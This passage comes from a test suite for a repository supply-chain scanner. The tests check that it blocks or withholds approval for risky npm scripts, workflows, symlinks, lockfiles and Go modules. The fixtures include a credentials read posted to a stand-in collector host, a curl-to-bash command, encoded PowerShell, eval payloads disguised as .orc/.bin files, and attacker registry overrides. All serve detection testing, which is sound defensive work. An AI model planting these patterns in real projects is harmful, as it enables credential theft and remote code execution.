        scanGitTree(fixture.root, fixture.sha, {
          changedPaths: ['.github/workflows/build.yml']
        })
      ).toThrow('Malformed GitHub Actions workflow YAML');
    }
  });

  it('does not treat JavaScript regex rules as executable payloads', async () => {
    const fixture = await repo({
      'scanner.mjs':
        'const rule = /\\beval\\s*\\(/iu;\nexport default rule.test("eval(");\n'
    });
    expect(scanGitTree(fixture.root, fixture.sha).status).toBe('approved');
  });

  it('does not treat inert child-process strings in scanner tests as execution', () => {
    const source = `const fixture = "spawnSync(command, args, { url: 'https://example.invalid' })";`;
    expect(scanText('tests/core/fixture.test.ts', source, [])).toEqual([]);
  });

  it('blocks symlinks that escape the repository tree', async () => {
    const fixture = await repo({ 'safe.txt': 'safe' });
    const linkBlob = execFileSync(
      'git',
      ['-C', fixture.root, 'hash-object', '-w', '--stdin'],
      {
        input: '../../outside',
        encoding: 'utf8'
      }
    ).trim();
    execFileSync('git', [
      '-C',
      fixture.root,
      'update-index',
      '--add',
      '--cacheinfo',
      `120000,${linkBlob},config/package.json`
    ]);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'escaping symlink'
    ]);
    const sha = execFileSync('git', ['-C', fixture.root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();
    expect(() => scanGitTree(fixture.root, sha)).toThrow(
      'Symlink escapes repository'
    );
  });

  it('traces changed entrypoints through in-repository directory symlinks', async () => {
    const fixture = await repo({
      'eslint.config.js': "import './linked/init.orc';\nexport default [];\n",
      'actual/init.orc': 'const payload = atob("ZXZpbA=="); eval(payload);\n'
    });
    const linkBlob = execFileSync(
      'git',
      ['-C', fixture.root, 'hash-object', '-w', '--stdin'],
      { input: 'actual', encoding: 'utf8' }
    ).trim();
    execFileSync('git', [
      '-C',
      fixture.root,
      'update-index',
      '--add',
      '--cacheinfo',
      `120000,${linkBlob},linked`
    ]);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add directory symlink'
    ]);
    const sha = execFileSync('git', ['-C', fixture.root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();

    const result = scanGitTree(fixture.root, sha, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> linked/init.orc'
    );
  });

  it('scans unusual-extension text and traces a changed config to an unchanged payload', async () => {
    const fixture = await repo({
      'eslint.config.js': "import './init.orc';\nexport default [];\n",
      'init.orc': 'const payload = atob("ZXZpbA=="); eval(payload);\n'
    });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await writeFile(
      path.join(fixture.root, 'eslint.config.js'),
      "import './init.orc';\nexport default [{ rules: {} }];\n"
    );
    git(['add', 'eslint.config.js']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'change lint config'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    const result = scanGitTree(fixture.root, head, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.changedFiles).toEqual(['eslint.config.js']);
    expect(result.findings).toContain('init.orc');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> init.orc'
    );
  });

  it('traces extensionless interpreter commands into disguised files and detects credential transfer', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'node bootstrap' }
      }),
      'bootstrap.orc': fixtureSource(
        "const credentials = fs.readFileSync('/home/runner/",
        '.aws/',
        'credentials',
        "'); fetch('https://collector.invalid', { method: 'POST', body: credentials });\n"
      )
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });

    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('bootstrap.orc#credential-transfer');
    expect(result.findings).toContain(
      'execution-chain:package.json -> bootstrap.orc'
    );
    expect(JSON.stringify(result)).not.toContain(
      ['/home/runner/.aws/', 'credentials'].join('')
    );
    expect(JSON.stringify(result)).not.toContain('collector.invalid');
  });

  it('does not report isolated local credential reads or benign startup setup', async () => {
    const fixture = await repo({
      'bootstrap.orc': fixtureSource(
        "const credentials = fs.readFileSync('~/",
        '.npmrc',
        "'); fs.appendFileSync('~/.bashrc', 'export PATH=$PATH');\n"
      )
    });
    expect(scanGitTree(fixture.root, fixture.sha).status).toBe('approved');
  });

  it('reports unsupported changed archives as incomplete instead of approved', async () => {
    const root = await mkdtemp(
      path.join(os.tmpdir(), 'toolip-stage-a-archive-')
    );
    roots.push(root);
    execFileSync('git', ['init', '-q', root]);
    await writeFile(
      path.join(root, 'bundle.zip'),
      Buffer.from([0x50, 0x4b, 0x03, 0x04])
    );
    execFileSync('git', ['-C', root, 'add', 'bundle.zip']);
    execFileSync('git', [
      '-C',
      root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add archive'
    ]);
    const sha = execFileSync('git', ['-C', root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();
    expect(
      scanGitTree(root, sha, { changedPaths: ['bundle.zip'] })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-archive:bundle.zip']
    });
  });

  it('reports renamed or disguised executable binaries as incomplete', async () => {
    const extensionless = await repo({
      dropper: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01])
    });
    expect(
      scanGitTree(extensionless.root, extensionless.sha, {
        changedPaths: ['dropper']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-binary:dropper']
    });

    const disguised = await repo({
      'image.png': Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03])
    });
    expect(
      scanGitTree(disguised.root, disguised.sha, {
        changedPaths: ['image.png']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-binary:image.png']
    });
  });

  it('reports dynamic imports in changed entrypoints as incomplete', async () => {
    const fixture = await repo({ 'eslint.config.js': 'export default [];' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await writeFile(
      path.join(fixture.root, 'eslint.config.js'),
      'const target = process.env.CONFIG; await import(target);\n'
    );
    git(['add', 'eslint.config.js']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add dynamic config loader'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    expect(
      scanGitTree(fixture.root, head, {
        changedPaths: ['eslint.config.js']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['execution-reference-coverage-incomplete']
    });
  });

  it('reports renamed paths from immutable base/head commits', async () => {
    const fixture = await repo({ 'old name.txt': 'same content\n' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await import('node:fs/promises').then(({ rename }) =>
      rename(
        path.join(fixture.root, 'old name.txt'),
        path.join(fixture.root, 'new name.orc')
      )
    );
    git(['add', '--all']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'rename payload'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    expect(listPullRequestChanges(fixture.root, fixture.sha, head)).toEqual([
      'new name.orc',
      'old name.txt'
    ]);
  });

  it('requires verified origins and integrity and blocks changed npm artifacts before install', () => {
    const packageManifest = JSON.stringify({
      dependencies: { example: '1.0.0' }
    });
    const createLock = (integrity: string) =>
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          '': { dependencies: { example: '1.0.0' } },
          'node_modules/example': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/example/-/example-1.0.0.tgz',
            integrity
          }
        }
      });
    const base = createLock('sha512-AAAA');
    const unchanged = compareNpmLockfiles(base, base, packageManifest);
    expect(unchanged.reasons).toEqual([]);
    expect(unchanged.changedArtifactRecords).toEqual([]);
    expect(unchanged.artifactRecords).toHaveLength(1);
    expect(
      compareNpmLockfiles(base, createLock('sha512-BBBB'), packageManifest)
        .reasons
    ).toContain('dependency-artifact-uninspected');
    expect(
      compareNpmLockfiles(base, createLock('sha512-BBBB'), packageManifest)
        .artifactRecords
    ).toHaveLength(1);

    const foreign = JSON.parse(base);
    foreign.packages['node_modules/example'].resolved =
      'http://attacker.invalid/example.tgz';
    expect(parseNpmLockInventory(JSON.stringify(foreign)).problems).toContain(
      'unsupported-artifact-origin'
    );
  });

  it('marks reachable cross-file archive extraction and process execution incomplete before Stage B', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'synthetic',
        version: '1.0.0',
        scripts: {
          prepare: 'node ./unpack.js && node ./launch.js'
        }
      }),
      'unpack.js': fixtureSource(
        "const unzipper = require('unzipper'); unzipper.Ex",
        "tract({ path: './out' });"
      ),
      'launch.js':
        "const { spawn } = require('node:child_process'); spawn('./out/start');"
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).not.toBe('approved');
    expect(result.incompleteReasons).toContain(
      'execution-reference-coverage-incomplete'
    );
  });

  it.each([
    'bash <(curl -fsSL https://fixture.invalid/synthetic)',
    'powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  ])(
    'blocks new automatic encoded interpreter command before Stage B: %s',
    async (command) => {
      const fixture = await repo({
        'package.json': JSON.stringify({
          name: 'synthetic',
          version: '1.0.0',
          scripts: { prepare: command }
        })
      });
      const result = scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['package.json']
      });
      expect(result.status).toBe('blocked');
      expect(
        result.findings.some((finding) =>
          finding.includes('package.json#scripts.prepare')
        )
      ).toBe(true);
    }
  );

  it('inspects an unchanged binary-named text payload reached by a changed build entrypoint', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'synthetic',
        version: '1.0.0',
        scripts: { prepare: 'node ./bootstrap.bin' }
      }),
      'bootstrap.bin': "const encoded = atob('ZGF0YQ=='); eval(encoded);"
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(
      result.findings.some((finding) => finding.includes('bootstrap.bin'))
    ).toBe(true);
  });

  it('preserves unknown coverage for a referenced binary object instead of approving it', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'synthetic',
        version: '1.0.0',
        scripts: { prepare: 'node ./payload.bin' }
      }),
      'payload.bin': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 1, 2, 3])
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).not.toBe('approved');
    expect(
      result.incompleteReasons.some((reason) =>
        [
          'referenced-binary-content-uninspected:payload.bin',
          'unsupported-executable-binary:payload.bin'
        ].includes(reason)
      ),
      JSON.stringify(result.incompleteReasons)
    ).toBe(true);
  });

  it('reports unsupported nested and alternate lockfiles even when unchanged', async () => {
    const fixtures = await Promise.all([
      repo({
        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
        'pnpm-lock.yaml': 'lockfileVersion: 9.0\npackages: {}\n'
      }),
      repo({
        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
        'packages/child/package-lock.json': JSON.stringify({
          lockfileVersion: 3,
          packages: {}
        })
      })
    ]);
    for (const fixture of fixtures) {
      expect(
        inspectDependencyChanges(fixture.root, fixture.sha, fixture.sha).reasons
      ).toContain('unsupported-lockfile-format');
    }
  });

  it.each([
    ['Swift package manager', 'Package.resolved'],
    ['Swift executable manifest', 'Package.swift'],
    ['CocoaPods', 'Podfile.lock'],
    ['Dart', 'pubspec.lock'],
    ['Elixir', 'mix.lock'],
    ['NuGet resolved package lock', 'packages.lock.json'],
    ['.NET central package versions', 'Directory.Packages.props'],
    ['.NET MSBuild project', 'src/App.csproj'],
    ['.NET solution', 'App.slnx']
  ])(
    'does not approve unsupported %s artifact provenance',
    async (_kind, filename) => {
      const fixture = await repo({
        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
        [filename]: 'synthetic untrusted dependency manifest'
      });
      const result = inspectDependencyChanges(
        fixture.root,
        fixture.sha,
        fixture.sha
      );
      expect(result.reasons).toContain(
        'unsupported-dependency-ecosystem-provenance'
      );
    }
  );

  it('marks npm lock overrides and unsupported Python and Ruby build inputs incomplete', async () => {
    const manifest = { name: 'root', version: '1.0.0' };
    const lock = {
      name: 'root',
      version: '1.0.0',
      lockfileVersion: 3,
      packages: {
        '': { name: 'root', version: '1.0.0' }
      }
    };
    const fixture = await repo({
      'package.json': JSON.stringify(manifest),
      'package-lock.json': JSON.stringify(lock),
      'npm-shrinkwrap.json': JSON.stringify(lock),
      'bun.lock': 'lockfileVersion = 1\n',
      'bun.lockb': Buffer.from([0, 1, 2, 3]),
      'pyproject.toml': '[build-system]\nrequires = ["setuptools"]\n',
      'requirements.in': 'example>=1\n',
      Gemfile: "source 'https://rubygems.org'\ngem 'example'\n",
      'Gemfile.lock': 'GEM\n  specs:\n    example (1.0.0)\n',
      'app.gemspec': "Gem::Specification.new { |spec| spec.name = 'app' }\n",
      '.bundle/config': 'BUNDLE_PATH: vendor/bundle\n'
    });

    const result = inspectDependencyChanges(
      fixture.root,
      fixture.sha,
      fixture.sha
    );

    expect(result.reasons).toContain('unsupported-lockfile-format');
    expect(result.reasons).toContain(
      'unsupported-dependency-ecosystem-provenance'
    );
  });

  it('marks unmodeled Deno, Pipenv, PDM and .NET execution incomplete', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: {
          deno: 'deno task build',
          pipenv: 'pipenv sync',
          pdm: 'pdm install',
          dotnet: 'dotnet test'
        }
      })
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unsupported-toolchain-execution:package.json#scripts.deno',
        'unsupported-toolchain-execution:package.json#scripts.dotnet',
        'unsupported-toolchain-execution:package.json#scripts.pdm',
        'unsupported-toolchain-execution:package.json#scripts.pipenv'
      ]
    });
  });

  it('marks unsupported resolver configuration and lock inputs incomplete', async () => {
    const inputs = [
      ['.cargo/config.toml', '[source.crates-io]\nreplace-with = "mirror"\n'],
      ['deno.json', '{"tasks":{"build":"deno run build.ts"}}\n'],
      ['deno.lock', '{"version":3,"remote":{}}\n'],
      ['pdm.lock', 'lock_version = "4.5"\n'],
      ['pixi.toml', '[workspace]\nname = "fixture"\n'],
      ['pixi.lock', 'version: 6\n'],
      ['environment.yml', 'dependencies:\n  - python=3.12\n'],
      ['vendor/modules.txt', '# example.test/lib v1.2.3\n'],
      ['gradle/libs.versions.toml', '[versions]\nexample = "1.2.3"\n'],
      ['gradle.properties', 'systemProp.example=true\n'],
      ['.mvn/extensions.xml', '<extensions/>\n'],
      ['.mvn/maven.config', '-s settings.xml\n']
    ];

    for (const [file, content] of inputs) {
      const fixture = await repo({ [file]: content });
      const result = inspectDependencyChanges(
        fixture.root,
        fixture.sha,
        fixture.sha
      );
      expect(result.reasons, file).toContain(
        'unsupported-dependency-ecosystem-provenance'
      );
    }
  });

  it('blocks repository npm registry configuration outside the attested registry policy', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      }),
      '.npmrc': 'registry=https://packages.attacker.invalid/\n'
    });

    const result = inspectDependencyChanges(
      fixture.root,
      fixture.sha,
      fixture.sha
    );

    expect(result.reasons).toContain('unsupported-npm-registry-configuration');
  });

  it('withholds approval for dynamic shell command resolution', async () => {
    const packageScript = await repo({
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: {
          pretest: 'PM=npm; "$PM" install untrusted-package@latest',
          prepack: 'env "$PACKAGE_MANAGER" install untrusted-package@latest'
        }
      }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    const packageScriptResult = scanGitTree(
      packageScript.root,
      packageScript.sha
    );
    expect(packageScriptResult.status).toBe('incomplete');
    expect(packageScriptResult.incompleteReasons).toContain(
      'dynamic-command-resolution:package.json#scripts.pretest'
    );
    expect(packageScriptResult.incompleteReasons).toContain(
      'dynamic-command-resolution:package.json#scripts.prepack'
    );

    const workflowAlias = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: |',
        '          alias npm="npm"',
        '          npm ci --ignore-scripts',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(scanGitTree(workflowAlias.root, workflowAlias.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'dynamic-command-resolution:.github/workflows/install.yml'
      ]
    });

    const workflowPath = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    env:',
        '      PATH: /tmp/untrusted-bin',
        '    steps:',
        '      - run: npm ci --ignore-scripts',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(scanGitTree(workflowPath.root, workflowPath.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'dynamic-command-resolution:.github/workflows/install.yml'
      ]
    });
  });

  it('withholds approval when a workflow delegates to an uninspected local action', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - uses: ./.github/actions/bootstrap',
        ''
      ].join('\n'),
      '.github/actions/bootstrap/action.yml': [
        'name: bootstrap',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - run: npm install untrusted-package@latest',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });

    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'local-action-execution-unverified:.github/workflows/build.yml'
      ]
    });
  });

  it('marks package manager resolution in a nested shell wrapper incomplete', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: { pretest: 'bash scripts/bootstrap.sh' }
      }),
      'scripts/bootstrap.sh': [
        '#!/usr/bin/env bash',
        'set -euo pipefail',
        'npm install untrusted-package@latest',
        ''
      ].join('\n')
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unverified-npm-resolution:scripts/bootstrap.sh']
    });

    const extensionless = await repo({
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: { pretest: 'bash scripts/bootstrap' }
      }),
      'scripts/bootstrap': 'npm install untrusted-package@latest\n'
    });
    expect(scanGitTree(extensionless.root, extensionless.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unverified-npm-resolution:scripts/bootstrap']
    });
  });

  it('withholds approval when automatic editor tasks replace executable lookup paths', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'open workspace',
            runOptions: { runOn: 'folderOpen' },
            command: 'npm',
            args: ['run', 'build'],
            options: { env: { PATH: '/tmp/untrusted-bin' } }
          }
        ]
      }),
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: { build: 'echo safe' }
      })
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'dynamic-command-resolution:.vscode/tasks.json#folderOpen'
      ]
    });
  });

  it('blocks script-driven package resolution outside the verified Stage A install', async () => {
    const scriptInstall = await repo({
      'package.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        scripts: {
          pretest:
            'npm --workspace packages/app install untrusted-package@latest',
          prepack: 'cross-env NODE_ENV=test npx untrusted-package@latest'
        }
      }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    const scriptInstallResult = scanGitTree(
      scriptInstall.root,
      scriptInstall.sha
    );
    expect(scriptInstallResult.status).toBe('incomplete');
    expect(scriptInstallResult.incompleteReasons).toContain(
      'unverified-npm-resolution:package.json#scripts.pretest'
    );
    expect(scriptInstallResult.incompleteReasons).toContain(
      'unverified-npm-resolution:package.json#scripts.prepack'
    );

    const nestedInstall = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    defaults:',
        '      run:',
        '        working-directory: packages/app',
        '    steps:',
        '      - run: npm ci',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      }),
      'packages/app/package.json': JSON.stringify({
        name: 'app',
        version: '1.0.0',
        dependencies: { untrusted: '^1.0.0' }
      })
    });
    expect(scanGitTree(nestedInstall.root, nestedInstall.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unverified-npm-resolution:.github/workflows/install.yml'
      ]
    });

    const rootCi = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: |',
        '          set -euo pipefail',
        '          npm ci --ignore-scripts',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(scanGitTree(rootCi.root, rootCi.sha).status).toBe('approved');

    const lifecycleEnabledInstall = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: npm ci',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(
      scanGitTree(lifecycleEnabledInstall.root, lifecycleEnabledInstall.sha)
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unverified-npm-resolution:.github/workflows/install.yml'
      ]
    });

    const registryOverride = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: npm ci --ignore-scripts --registry=https://attacker.invalid/',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(
      scanGitTree(registryOverride.root, registryOverride.sha)
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unverified-npm-resolution:.github/workflows/install.yml'
      ]
    });

    const environmentRegistryOverride = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: NPM_CONFIG_REGISTRY=https://attacker.invalid/ npm ci --ignore-scripts',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(
      scanGitTree(
        environmentRegistryOverride.root,
        environmentRegistryOverride.sha
      )
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unverified-npm-resolution:.github/workflows/install.yml'
      ]
    });

    const workflowEnvRegistry = await repo({
      '.github/workflows/install.yml': [
        'name: install',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: npm ci --ignore-scripts',
        '        env:',
        '          npm_config_registry: https://attacker.invalid/',
        ''
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
      'package-lock.json': JSON.stringify({
        name: 'root',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: { '': { name: 'root', version: '1.0.0' } }
      })
    });
    expect(
      scanGitTree(workflowEnvRegistry.root, workflowEnvRegistry.sha)
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unverified-npm-resolution:.github/workflows/install.yml'
      ]
    });
  });

  it('withholds Stage A approval when Go or Cargo provenance is incomplete', async () => {
    const fixture = await repo({
      'go.mod': 'module example.test/app\nrequire example.test/lib v1.2.3\n',
      'go.sum': 'example.test/lib v1.2.3 h1:YWJjZA==\n',
      'Cargo.lock': '[[package]]\nname = "serde"\nversion = "1.0.0"\n'
    });
    const result = inspectDependencyChanges(
      fixture.root,
      fixture.sha,
      fixture.sha
    );
    expect(result.reasons).toContain('go-sum-invalid:go.sum');
    expect(result.reasons).toContain('go-module-checksum-missing:go.mod');
    expect(result.goArtifactRecords).toEqual([]);
  });

  it('builds an exact bounded Go module inventory from go.mod and go.sum', () => {
    const alphaHash = Buffer.alloc(32, 1).toString('base64');
    const betaHash = Buffer.alloc(32, 2).toString('base64');
    const result = parseGoModuleArtifactInventory(
      [
        'module example.test/app',
        'require example.test/alpha v1.2.3',
        'require (',
        '  example.test/beta v0.4.0 // indirect',
        ')'
      ].join('\n'),
      [
        `example.test/alpha v1.2.3 h1:${alphaHash}`,
        `example.test/alpha v1.2.3/go.mod h1:${betaHash}`,
        `example.test/beta v0.4.0 h1:${betaHash}`
      ].join('\n')
    );

    expect(result).toMatchObject({ packageCount: 2, reasons: [] });
    expect(result.artifactRecords).toHaveLength(2);
    expect(result.artifactRecords.map((item) => item.checksum)).toEqual([
      alphaHash,
      betaHash
    ]);
    expect(
      result.artifactRecords.every((item) =>
        item.location.startsWith('go-module/')
      )
    ).toBe(true);
  });

  it('keeps replaced, missing and conflicting Go module identities fail closed', () => {
    const firstHash = Buffer.alloc(32, 3).toString('base64');
    const secondHash = Buffer.alloc(32, 4).toString('base64');
    const result = parseGoModuleArtifactInventory(
      [
        'module example.test/app',
        'require example.test/lib v1.0.0',
        'require example.test/missing v2.0.0',
        'replace example.test/lib => ../lib'
      ].join('\n'),
      [
        `example.test/lib v1.0.0 h1:${firstHash}`,
        `example.test/lib v1.0.0 h1:${secondHash}`
      ].join('\n')
    );

    expect(result.artifactRecords).toEqual([]);
    expect(result.reasons).toEqual([
      'go-module-checksum-conflict:go.sum',
      'go-module-checksum-missing:go.mod',
      'go-module-replacement-unverified:go.mod'
    ]);
  });

  it('verifies and scans a bounded Go module ZIP without extraction', () => {
    const module = 'example.test/Upper';
    const version = 'v1.2.3';
    const files: Array<[string, string]> = [
      ['go.mod', `module ${module}\n`],
      ['install.go', 'package upper\n// harmless source\n']
    ];
    const root = `${module}@${version}/`;
    const checksum = createHash('sha256')
      .update(
        files
          .map(
            ([name, content]) =>
              `${createHash('sha256').update(content).digest('hex')}  ${root}${name}\n`
          )
          .sort((left, right) => left.slice(66).localeCompare(right.slice(66)))
          .join('')
      )
      .digest('base64');
    const archive = storedZip(
      files.map(([name, content]) => [`${root}${name}`, content])
    );
    expect(
      inspectGoModuleZip(archive, {
        module,
        version,
        checksum,
        location: 'go-module/Z28ubW9k/ZXhhbXBsZS50ZXN0L1VwcGVy@djEuMi4z#digest'
      })
    ).toMatchObject({
      files: 2,
      reasons: [],
      binaryFiles: 0
    });

    const traversal = storedZip([[`${root}../escape`, 'payload']]);
    expect(
      inspectGoModuleZip(traversal, {
        module,
        version,
        checksum,
        location: 'go-module/test'
      }).reasons
    ).toContain('go-zip-entry-name-invalid');
  });

  it('sorts Go checksum filenames by UTF-8 bytes', () => {
    const root = 'example.test/Upper@v1.2.3/';
    const archive = storedZip([
      [`${root}𐐀.go`, 'deseret\n'],
      [`${root}Ａ.go`, 'fullwidth\n']
    ]);
    expect(
      inspectGoModuleZip(archive, {
        module: 'example.test/Upper',
        version: 'v1.2.3',
        checksum: 'CpeIok+NlDBI6XuuQvUTuGtf90dnSTX2ywL+6PsdXmI=',
        location: 'go-module/test'
      }).reasons
    ).toEqual([]);
  });

  it('fetches the exact Go proxy artifact and records complete coverage', async () => {
    const module = 'example.test/lib';
    const version = 'v1.0.0';
    const content = `module ${module}\n`;
    const checksum = createHash('sha256')
      .update(
        `${createHash('sha256').update(content).digest('hex')}  ${module}@${version}/go.mod\n`
      )
      .digest('base64');
    const archive = storedZip([[`${module}@${version}/go.mod`, content]]);
    const digest = Buffer.from(checksum, 'base64').toString('hex');
    const location = `go-module/Z28ubW9k/${Buffer.from(module).toString('base64url')}@${Buffer.from(version).toString('base64url')}#${digest}`;
    const result = await inspectGoArtifacts(
      [{ module, version, checksum, location }],
      {
